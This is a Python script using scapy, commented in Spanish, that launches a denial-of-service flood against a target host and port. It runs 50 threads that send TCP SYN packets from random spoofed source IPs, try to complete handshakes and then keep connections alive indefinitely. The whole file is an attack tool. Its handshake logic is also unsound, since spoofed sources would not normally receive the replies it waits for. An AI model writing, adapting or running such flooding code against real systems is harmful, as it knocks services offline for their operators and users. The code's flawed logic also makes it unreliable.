from scapy.all import *
import threading
import random
import time

def random_ip():
    """Genera una dirección IP aleatoria"""
    return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

def send_spoofed_syn_ack(ip, port):
    """Envía paquetes SYN, completa el handshake TCP y mantiene la conexión viva"""
    try:
        while True:
            spoofed_ip = random_ip()
            # Crear el paquete SYN con IP de origen falsificada
            syn_packet = IP(src=spoofed_ip, dst=ip) / TCP(dport=port, flags='S')
            syn_ack = sr1(syn_packet, timeout=2)  # Enviar SYN y recibir SYN-ACK

            if syn_ack and TCP in syn_ack and syn_ack[TCP].flags == 'SA':
                # Completar el three-way handshake enviando ACK
                ack_packet = IP(src=spoofed_ip, dst=ip) / TCP(dport=port, sport=syn_ack[TCP].dport, 
                                                              flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
                send(ack_packet)
                print(f"Conexión establecida desde {spoofed_ip} hacia {ip}:{port}")

                # Mantener la conexión abierta enviando paquetes TCP con la bandera ACK
                while True:
                    keep_alive_packet = IP(src=spoofed_ip, dst=ip) / TCP(dport=port, sport=syn_ack[TCP].dport, 
                                                                        flags='A', seq=ack_packet.seq, 
                                                                        ack=syn_ack.seq + 1)
                    send(keep_alive_packet)
                    print(f"Enviando keep-alive desde {spoofed_ip} hacia {ip}:{port}")
                    time.sleep(10)  # Pausa entre envíos de keep-alive
            else:
                print(f"No se recibió SYN-ACK desde {ip}:{port}")

            time.sleep(0.5)  # Pausa breve antes de la siguiente conexión
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    target_ip = "10.0.0.1"  # IP del servidor de prueba
    target_port = 80        # Puerto del servidor de prueba

    # Crear múltiples hilos para simular múltiples fuentes de ataque
    for i in range(50):  # Ajusta el número de hilos según sea necesario
        thread = threading.Thread(target=send_spoofed_syn_ack, args=(target_ip, target_port))
        thread.start()
        time.sleep(0.2)  # Retraso breve para escalonar la creación de conexiones